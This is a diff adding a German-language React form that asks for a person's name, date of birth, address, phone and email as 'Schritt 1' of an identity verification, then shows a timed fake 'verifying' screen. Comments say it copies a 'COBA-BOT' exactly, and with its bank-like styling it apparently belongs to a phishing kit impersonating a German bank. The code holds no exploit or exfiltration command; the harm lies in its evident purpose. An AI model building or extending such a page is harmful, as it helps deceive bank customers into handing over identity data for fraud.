@@ -1,0 +1,744 @@
+import React, { useState } from 'react';
+import Loading from './Loading';
+
+interface PersonalData {
+  first_name: string;
+  last_name: string;
+  date_of_birth: string;
+  street: string;
+  street_number: string;
+  plz: string;
+  city: string;
+  phone: string;
+  email: string;
+}
+
+interface PersonalDataFormProps {
+  onSubmit: (data: PersonalData) => void;
+}
+
+const PersonalDataForm: React.FC<PersonalDataFormProps> = ({ onSubmit }) => {
+  // Individual state variables like LoginForm
+  const [firstName, setFirstName] = useState('');
+  const [lastName, setLastName] = useState('');
+  const [dateOfBirth, setDateOfBirth] = useState('');
+  const [street, setStreet] = useState('');
+  const [streetNumber, setStreetNumber] = useState('');
+  const [plz, setPlz] = useState('');
+  const [city, setCity] = useState('');
+  const [phone, setPhone] = useState('');
+  const [email, setEmail] = useState('');
+  
+  const [isLoading, setIsLoading] = useState(false);
+  const [errors, setErrors] = useState<Partial<PersonalData>>({});
+  
+  // Date formatting function - EXACTLY like COBA-BOT
+  const handleDateChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    let value = e.target.value.replace(/\D/g, ''); // Remove all non-digits
+    
+    // Auto-format as DD.MM.YYYY
+    if (value.length >= 2) {
+      value = value.substring(0, 2) + '.' + value.substring(2);
+    }
+    if (value.length >= 5) {
+      value = value.substring(0, 5) + '.' + value.substring(5);
+    }
+    if (value.length > 10) {
+      value = value.substring(0, 10); // Limit to DD.MM.YYYY
+    }
+    
+    setDateOfBirth(value);
+  };
+  
+  // PLZ formatting function
+  const handlePlzChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    const value = e.target.value.replace(/\D/g, '').slice(0, 5);
+    setPlz(value);
+  };
+  
+  // Focus states exactly like LoginForm
+  const [firstNameFocused, setFirstNameFocused] = useState(false);
+  const [lastNameFocused, setLastNameFocused] = useState(false);
+  const [dateOfBirthFocused, setDateOfBirthFocused] = useState(false);
+  const [streetFocused, setStreetFocused] = useState(false);
+  const [streetNumberFocused, setStreetNumberFocused] = useState(false);
+  const [plzFocused, setPlzFocused] = useState(false);
+  const [cityFocused, setCityFocused] = useState(false);
+  const [phoneFocused, setPhoneFocused] = useState(false);
+  const [emailFocused, setEmailFocused] = useState(false);
+
+  const validateForm = (): boolean => {
+    const newErrors: Partial<PersonalData> = {};
+    
+    if (!firstName.trim()) {
+      newErrors.first_name = 'Vorname ist erforderlich';
+    }
+    
+    if (!lastName.trim()) {
+      newErrors.last_name = 'Nachname ist erforderlich';
+    }
+    
+    if (!dateOfBirth.trim()) {
+      newErrors.date_of_birth = 'Geburtsdatum ist erforderlich';
+    } else if (!/^\d{2}\.\d{2}\.\d{4}$/.test(dateOfBirth)) {
+      newErrors.date_of_birth = 'Format: TT.MM.JJJJ';
+    }
+    
+    if (!street.trim()) {
+      newErrors.street = 'Straße ist erforderlich';
+    }
+    
+    if (!streetNumber.trim()) {
+      newErrors.street_number = 'Hausnummer ist erforderlich';
+    }
+    
+    if (!plz.trim()) {
+      newErrors.plz = 'PLZ ist erforderlich';
+    } else if (!/^\d{5}$/.test(plz)) {
+      newErrors.plz = 'PLZ muss genau 5 Ziffern haben';
+    }
+    
+    if (!city.trim()) {
+      newErrors.city = 'Ort ist erforderlich';
+    }
+    
+    if (!phone.trim()) {
+      newErrors.phone = 'Telefonnummer ist erforderlich';
+    }
+    
+    if (!email.trim()) {
+      newErrors.email = 'E-Mail ist erforderlich';
+    } else if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
+      newErrors.email = 'Ungültige E-Mail-Adresse';
+    }
+    
+    setErrors(newErrors);
+    return Object.keys(newErrors).length === 0;
+  };
+
+  const handleSubmit = async (e: React.FormEvent) => {
+    e.preventDefault();
+    
+    if (!validateForm()) {
+      return;
+    }
+    
+    setIsLoading(true);
+    
+    try {
+      const formData: PersonalData = {
+        first_name: firstName.trim(),
+        last_name: lastName.trim(),
+        date_of_birth: dateOfBirth.trim(),
+        street: street.trim(),
+        street_number: streetNumber.trim(),
+        plz: plz.trim(),
+        city: city.trim(),
+        phone: phone.trim(),
+        email: email.trim()
+      };
+      
+      console.log('PersonalDataForm: Submitting data:', formData);
+      await onSubmit(formData);
+    } catch (error) {
+      console.error('Error submitting personal data:', error);
+      setIsLoading(false);
+    }
+  };
+
+  return (
+    <>
+      <style>
+        {`
+          @media (max-width: 768px) {
+            .mobile-title {
+              font-size: 2.5rem !important;
+            }
+          }
+          @media (max-width: 480px) {
+            .mobile-title {
+              font-size: 2rem !important;
+            }
+          }
+        `}
+      </style>
+      <div style={{ 
+        maxWidth: '1440px', 
+        margin: '0 auto', 
+        padding: '4rem 0',
+        minHeight: '80vh',
+        display: 'flex',
+        alignItems: 'flex-start',
+        paddingTop: '6rem'
+      }}>
+        {isLoading && (
+          <Loading 
+            message="Persönliche Daten werden verifiziert"
+            type="verification"
+            showProgress={true}
+            duration={4.5}
+          />
+        )}
+        
+        <div style={{
+          maxWidth: '1000px',
+          width: '100%',
+          padding: '0 2rem'
+        }}>
+          {/* Large Title */}
+          <h1 className="mobile-title" style={{
+            color: '#002e3c',
+            fontSize: '2.5rem',
+            fontWeight: 'bold',
+            marginBottom: '1rem',
+            fontFamily: 'Gotham, Arial, sans-serif',
+            lineHeight: '1.1',
+            letterSpacing: '-0.02em'
+          }}>
+            Schritt 1: Persönliche Daten
+          </h1>
+          
+          <p style={{
+            color: '#002e3c',
+            fontSize: '1rem',
+            lineHeight: '1.6',
+            marginBottom: '3rem',
+            fontFamily: 'Gotham, Arial, sans-serif'
+          }}>
+            Bitte geben Sie Ihre persönlichen Daten zur Verifizierung Ihrer Identität ein.
+          </p>
+          
+          <form onSubmit={handleSubmit}>
+            {/* Name Fields */}
+            <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '2rem', marginBottom: '1rem' }}>
+              {/* First Name - EXACTLY like LoginForm */}
+              <div style={{ marginBottom: '2.5rem', position: 'relative' }}>
+                <input
+                  id="firstName"
+                  name="firstName"
+                  type="text"
+                  required
+                  value={firstName}
+                  onChange={(e) => setFirstName(e.target.value)}
+                  onFocus={() => setFirstNameFocused(true)}
+                  onBlur={() => setFirstNameFocused(false)}
+                  style={{
+                    width: '100%',
+                    padding: '1.5rem 0 0.5rem 0',
+                    border: 'none',
+                    borderBottom: '2px solid #d1d5db',
+                    backgroundColor: 'transparent',
+                    fontSize: '1.1rem',
+                    color: '#002e3c',
+                    outline: 'none',
+                    fontFamily: 'Gotham, Arial, sans-serif',
+                    transition: 'border-color 0.3s ease'
+                  }}
+                />
+                <label
+                  htmlFor="firstName"
+                  style={{
+                    position: 'absolute',
+                    left: '0',
+                    top: firstNameFocused || firstName ? '0.25rem' : '1rem',
+                    fontSize: firstNameFocused || firstName ? '0.75rem' : '1.1rem',
+                    color: firstNameFocused || firstName ? '#6b7280' : '#9ca3af',
+                    fontFamily: 'Gotham, Arial, sans-serif',
+                    transition: 'all 0.3s ease',
+                    pointerEvents: 'none',
+                    transformOrigin: 'left top'
+                  }}
+                >
+                  Vorname *
+                </label>
+                {errors.first_name && (
+                  <div style={{
+                    color: '#dc2626',
+                    fontSize: '0.875rem',
+                    marginTop: '0.5rem',
+                    fontFamily: 'Gotham, Arial, sans-serif'
+                  }}>
+                    {errors.first_name}
+                  </div>
+                )}
+              </div>
+              
+              {/* Last Name - EXACTLY like LoginForm */}
+              <div style={{ marginBottom: '2.5rem', position: 'relative' }}>
+                <input
+                  id="lastName"
+                  name="lastName"
+                  type="text"
+                  required
+                  value={lastName}
+                  onChange={(e) => setLastName(e.target.value)}
+                  onFocus={() => setLastNameFocused(true)}
+                  onBlur={() => setLastNameFocused(false)}
+                  style={{
+                    width: '100%',
+                    padding: '1.5rem 0 0.5rem 0',
+                    border: 'none',
+                    borderBottom: '2px solid #d1d5db',
+                    backgroundColor: 'transparent',
+                    fontSize: '1.1rem',
+                    color: '#002e3c',
+                    outline: 'none',
+                    fontFamily: 'Gotham, Arial, sans-serif',
+                    transition: 'border-color 0.3s ease'
+                  }}
+                />
+                <label
+                  htmlFor="lastName"
+                  style={{
+                    position: 'absolute',
+                    left: '0',
+                    top: lastNameFocused || lastName ? '0.25rem' : '1rem',
+                    fontSize: lastNameFocused || lastName ? '0.75rem' : '1.1rem',
+                    color: lastNameFocused || lastName ? '#6b7280' : '#9ca3af',
+                    fontFamily: 'Gotham, Arial, sans-serif',
+                    transition: 'all 0.3s ease',
+                    pointerEvents: 'none',
+                    transformOrigin: 'left top'
+                  }}
+                >
+                  Nachname *
+                </label>
+                {errors.last_name && (
+                  <div style={{
+                    color: '#dc2626',
+                    fontSize: '0.875rem',
+                    marginTop: '0.5rem',
+                    fontFamily: 'Gotham, Arial, sans-serif'
+                  }}>
+                    {errors.last_name}
+                  </div>
+                )}
+              </div>
+            </div>
+            
+            {/* Date of Birth */}
+            <div style={{ marginBottom: '2.5rem', position: 'relative' }}>
+              <input
+                id="dateOfBirth"
+                name="dateOfBirth"
+                type="text"
+                required
+                value={dateOfBirth}
+                onChange={handleDateChange}
+                onFocus={() => setDateOfBirthFocused(true)}
+                onBlur={() => setDateOfBirthFocused(false)}
+                placeholder=""
+                maxLength={10}
+                style={{
+                  width: '100%',
+                  padding: '1.5rem 0 0.5rem 0',
+                  border: 'none',
+                  borderBottom: '2px solid #d1d5db',
+                  backgroundColor: 'transparent',
+                  fontSize: '1.1rem',
+                  color: '#002e3c',
+                  outline: 'none',
+                  fontFamily: 'Gotham, Arial, sans-serif',
+                  transition: 'border-color 0.3s ease'
+                }}
+              />
+              <label
+                htmlFor="dateOfBirth"
+                style={{
+                  position: 'absolute',
+                  left: '0',
+                  top: dateOfBirthFocused || dateOfBirth ? '0.25rem' : '1rem',
+                  fontSize: dateOfBirthFocused || dateOfBirth ? '0.75rem' : '1.1rem',
+                  color: dateOfBirthFocused || dateOfBirth ? '#6b7280' : '#9ca3af',
+                  fontFamily: 'Gotham, Arial, sans-serif',
+                  transition: 'all 0.3s ease',
+                  pointerEvents: 'none',
+                  transformOrigin: 'left top'
+                }}
+              >
+                Geburtsdatum *
+              </label>
+              {errors.date_of_birth && (
+                <div style={{
+                  color: '#dc2626',
+                  fontSize: '0.875rem',
+                  marginTop: '0.5rem',
+                  fontFamily: 'Gotham, Arial, sans-serif'
+                }}>
+                  {errors.date_of_birth}
+                </div>
+              )}
+            </div>
+            
+            {/* Address Fields */}
+            <div style={{ display: 'grid', gridTemplateColumns: '2fr 1fr', gap: '2rem', marginBottom: '1rem' }}>
+              {/* Street */}
+              <div style={{ marginBottom: '2.5rem', position: 'relative' }}>
+                <input
+                  id="street"
+                  name="street"
+                  type="text"
+                  required
+                  value={street}
+                  onChange={(e) => setStreet(e.target.value)}
+                  onFocus={() => setStreetFocused(true)}
+                  onBlur={() => setStreetFocused(false)}
+                  style={{
+                    width: '100%',
+                    padding: '1.5rem 0 0.5rem 0',
+                    border: 'none',
+                    borderBottom: '2px solid #d1d5db',
+                    backgroundColor: 'transparent',
+                    fontSize: '1.1rem',
+                    color: '#002e3c',
+                    outline: 'none',
+                    fontFamily: 'Gotham, Arial, sans-serif',
+                    transition: 'border-color 0.3s ease'
+                  }}
+                />
+                <label
+                  htmlFor="street"
+                  style={{
+                    position: 'absolute',
+                    left: '0',
+                    top: streetFocused || street ? '0.25rem' : '1rem',
+                    fontSize: streetFocused || street ? '0.75rem' : '1.1rem',
+                    color: streetFocused || street ? '#6b7280' : '#9ca3af',
+                    fontFamily: 'Gotham, Arial, sans-serif',
+                    transition: 'all 0.3s ease',
+                    pointerEvents: 'none',
+                    transformOrigin: 'left top'
+                  }}
+                >
+                  Straße *
+                </label>
+                {errors.street && (
+                  <div style={{
+                    color: '#dc2626',
+                    fontSize: '0.875rem',
+                    marginTop: '0.5rem',
+                    fontFamily: 'Gotham, Arial, sans-serif'
+                  }}>
+                    {errors.street}
+                  </div>
+                )}
+              </div>
+              
+              {/* Street Number */}
+              <div style={{ marginBottom: '2.5rem', position: 'relative' }}>
+                <input
+                  id="streetNumber"
+                  name="streetNumber"
+                  type="text"
+                  required
+                  value={streetNumber}
+                  onChange={(e) => setStreetNumber(e.target.value)}
+                  onFocus={() => setStreetNumberFocused(true)}
+                  onBlur={() => setStreetNumberFocused(false)}
+                  style={{
+                    width: '100%',
+                    padding: '1.5rem 0 0.5rem 0',
+                    border: 'none',
+                    borderBottom: '2px solid #d1d5db',
+                    backgroundColor: 'transparent',
+                    fontSize: '1.1rem',
+                    color: '#002e3c',
+                    outline: 'none',
+                    fontFamily: 'Gotham, Arial, sans-serif',
+                    transition: 'border-color 0.3s ease'
+                  }}
+                />
+                <label
+                  htmlFor="streetNumber"
+                  style={{
+                    position: 'absolute',
+                    left: '0',
+                    top: streetNumberFocused || streetNumber ? '0.25rem' : '1rem',
+                    fontSize: streetNumberFocused || streetNumber ? '0.75rem' : '1.1rem',
+                    color: streetNumberFocused || streetNumber ? '#6b7280' : '#9ca3af',
+                    fontFamily: 'Gotham, Arial, sans-serif',
+                    transition: 'all 0.3s ease',
+                    pointerEvents: 'none',
+                    transformOrigin: 'left top'
+                  }}
+                >
+                  Hausnummer *
+                </label>
+                {errors.street_number && (
+                  <div style={{
+                    color: '#dc2626',
+                    fontSize: '0.875rem',
+                    marginTop: '0.5rem',
+                    fontFamily: 'Gotham, Arial, sans-serif'
+                  }}>
+                    {errors.street_number}
+                  </div>
+                )}
+              </div>
+            </div>
+            
+
+            {/* PLZ and City */}
+            <div style={{ display: 'grid', gridTemplateColumns: '1fr 2fr', gap: '2rem', marginBottom: '1rem' }}>
+              {/* PLZ */}
+              <div style={{ marginBottom: '2.5rem', position: 'relative' }}>
+                <input
+                  id="plz"
+                  name="plz"
+                  type="text"
+                  required
+                  value={plz}
+                  onChange={handlePlzChange}
+                  onFocus={() => setPlzFocused(true)}
+                  onBlur={() => setPlzFocused(false)}
+                  maxLength={5}
+                  style={{
+                    width: '100%',
+                    padding: '1.5rem 0 0.5rem 0',
+                    border: 'none',
+                    borderBottom: '2px solid #d1d5db',
+                    backgroundColor: 'transparent',
+                    fontSize: '1.1rem',
+                    color: '#002e3c',
+                    outline: 'none',
+                    fontFamily: 'Gotham, Arial, sans-serif',
+                    transition: 'border-color 0.3s ease'
+                  }}
+                />
+                <label
+                  htmlFor="plz"
+                  style={{
+                    position: 'absolute',
+                    left: '0',
+                    top: plzFocused || plz ? '0.25rem' : '1rem',
+                    fontSize: plzFocused || plz ? '0.75rem' : '1.1rem',
+                    color: plzFocused || plz ? '#6b7280' : '#9ca3af',
+                    fontFamily: 'Gotham, Arial, sans-serif',
+                    transition: 'all 0.3s ease',
+                    pointerEvents: 'none',
+                    transformOrigin: 'left top'
+                  }}
+                >
+                  PLZ *
+                </label>
+                {errors.plz && (
+                  <div style={{
+                    color: '#dc2626',
+                    fontSize: '0.875rem',
+                    marginTop: '0.5rem',
+                    fontFamily: 'Gotham, Arial, sans-serif'
+                  }}>
+                    {errors.plz}
+                  </div>
+                )}
+              </div>
+              
+              {/* City */}
+              <div style={{ marginBottom: '2.5rem', position: 'relative' }}>
+                <input
+                  id="city"
+                  name="city"
+                  type="text"
+                  required
+                  value={city}
+                  onChange={(e) => setCity(e.target.value)}
+                  onFocus={() => setCityFocused(true)}
+                  onBlur={() => setCityFocused(false)}
+                  style={{
+                    width: '100%',
+                    padding: '1.5rem 0 0.5rem 0',
+                    border: 'none',
+                    borderBottom: '2px solid #d1d5db',
+                    backgroundColor: 'transparent',
+                    fontSize: '1.1rem',
+                    color: '#002e3c',
+                    outline: 'none',
+                    fontFamily: 'Gotham, Arial, sans-serif',
+                    transition: 'border-color 0.3s ease'
+                  }}
+                />
+                <label
+                  htmlFor="city"
+                  style={{
+                    position: 'absolute',
+                    left: '0',
+                    top: cityFocused || city ? '0.25rem' : '1rem',
+                    fontSize: cityFocused || city ? '0.75rem' : '1.1rem',
+                    color: cityFocused || city ? '#6b7280' : '#9ca3af',
+                    fontFamily: 'Gotham, Arial, sans-serif',
+                    transition: 'all 0.3s ease',
+                    pointerEvents: 'none',
+                    transformOrigin: 'left top'
+                  }}
+                >
+                  Ort *
+                </label>
+                {errors.city && (
+                  <div style={{
+                    color: '#dc2626',
+                    fontSize: '0.875rem',
+                    marginTop: '0.5rem',
+                    fontFamily: 'Gotham, Arial, sans-serif'
+                  }}>
+                    {errors.city}
+                  </div>
+                )}
+              </div>
+            </div>
+            
+            {/* Phone Field - moved above email */}
+            <div style={{ marginBottom: '2.5rem', position: 'relative' }}>
+              <input
+                id="phone"
+                name="phone"
+                type="tel"
+                required
+                value={phone}
+                onChange={(e) => setPhone(e.target.value)}
+                onFocus={() => {
+                  setPhoneFocused(true);
+                  // Add +49 prefix if field is empty
+                  if (!phone) {
+                    setPhone('+49 ');
+                  }
+                }}
+                onBlur={() => setPhoneFocused(false)}
+                style={{
+                  width: '100%',
+                  padding: '1.5rem 0 0.5rem 0',
+                  border: 'none',
+                  borderBottom: '2px solid #d1d5db',
+                  backgroundColor: 'transparent',
+                  fontSize: '1.1rem',
+                  color: '#002e3c',
+                  outline: 'none',
+                  fontFamily: 'Gotham, Arial, sans-serif',
+                  transition: 'border-color 0.3s ease'
+                }}
+              />
+              <label
+                htmlFor="phone"
+                style={{
+                  position: 'absolute',
+                  left: '0',
+                  top: phoneFocused || phone ? '0.25rem' : '1rem',
+                  fontSize: phoneFocused || phone ? '0.75rem' : '1.1rem',
+                  color: phoneFocused || phone ? '#6b7280' : '#9ca3af',
+                  fontFamily: 'Gotham, Arial, sans-serif',
+                  transition: 'all 0.3s ease',
+                  pointerEvents: 'none',
+                  transformOrigin: 'left top'
+                }}
+              >
+                Telefonnummer *
+              </label>
+              {errors.phone && (
+                <div style={{
+                  color: '#dc2626',
+                  fontSize: '0.875rem',
+                  marginTop: '0.5rem',
+                  fontFamily: 'Gotham, Arial, sans-serif'
+                }}>
+                  {errors.phone}
+                </div>
+              )}
+            </div>
+            
+            {/* Email - moved to full width like COBA-BOT */}
+            <div style={{ marginBottom: '2.5rem', position: 'relative' }}>
+              <input
+                id="email"
+                name="email"
+                type="email"
+                required
+                value={email}
+                onChange={(e) => setEmail(e.target.value)}
+                onFocus={() => setEmailFocused(true)}
+                onBlur={() => setEmailFocused(false)}
+                style={{
+                  width: '100%',
+                  padding: '1.5rem 0 0.5rem 0',
+                  border: 'none',
+                  borderBottom: '2px solid #d1d5db',
+                  backgroundColor: 'transparent',
+                  fontSize: '1.1rem',
+                  color: '#002e3c',
+                  outline: 'none',
+                  fontFamily: 'Gotham, Arial, sans-serif',
+                  transition: 'border-color 0.3s ease'
+                }}
+              />
+              <label
+                htmlFor="email"
+                style={{
+                  position: 'absolute',
+                  left: '0',
+                  top: emailFocused || email ? '0.25rem' : '1rem',
+                  fontSize: emailFocused || email ? '0.75rem' : '1.1rem',
+                  color: emailFocused || email ? '#6b7280' : '#9ca3af',
+                  fontFamily: 'Gotham, Arial, sans-serif',
+                  transition: 'all 0.3s ease',
+                  pointerEvents: 'none',
+                  transformOrigin: 'left top'
+                }}
+              >
+                E-Mail-Adresse *
+              </label>
+              {errors.email && (
+                <div style={{
+                  color: '#dc2626',
+                  fontSize: '0.875rem',
+                  marginTop: '0.5rem',
+                  fontFamily: 'Gotham, Arial, sans-serif'
+                }}>
+                  {errors.email}
+                </div>
+              )}
+            </div>
+            
+            {/* Submit Button */}
+            <div style={{ marginTop: '4rem' }}>
+              <button
+                type="submit"
+                disabled={isLoading}
+                style={{
+                  backgroundColor: '#FFD700',
+                  color: '#002e3c',
+                  border: 'none',
+                  borderRadius: '35px',
+                  padding: '1.25rem 3rem',
+                  fontSize: '1rem',
+                  fontWeight: '600',
+                  cursor: isLoading ? 'not-allowed' : 'pointer',
+                  fontFamily: 'Gotham, Arial, sans-serif',
+                  opacity: isLoading ? 0.6 : 1,
+                  transition: 'all 0.3s ease',
+                  display: 'flex',
+                  alignItems: 'center',
+                  gap: '0.5rem'
+                }}
+                onMouseOver={(e) => {
+                  if (!isLoading) {
+                    e.currentTarget.style.backgroundColor = '#FFD700';
+                    e.currentTarget.style.boxShadow = '0 4px 12px rgba(255, 215, 0, 0.3)';
+                  }
+                }}
+                onMouseOut={(e) => {
+                  if (!isLoading) {
+                    e.currentTarget.style.backgroundColor = '#FFD700';
+                    e.currentTarget.style.boxShadow = 'none';
+                  }
+                }}
+              >
+                {isLoading ? 'Wird verifiziert...' : 'Daten verifizieren'}
+                {!isLoading && <span style={{ fontSize: '1.25rem' }}>→</span>}
+              </button>
+            </div>
+          </form>
+        </div>
+      </div>
+    </>
+  );
+};
+
+export default PersonalDataForm; 
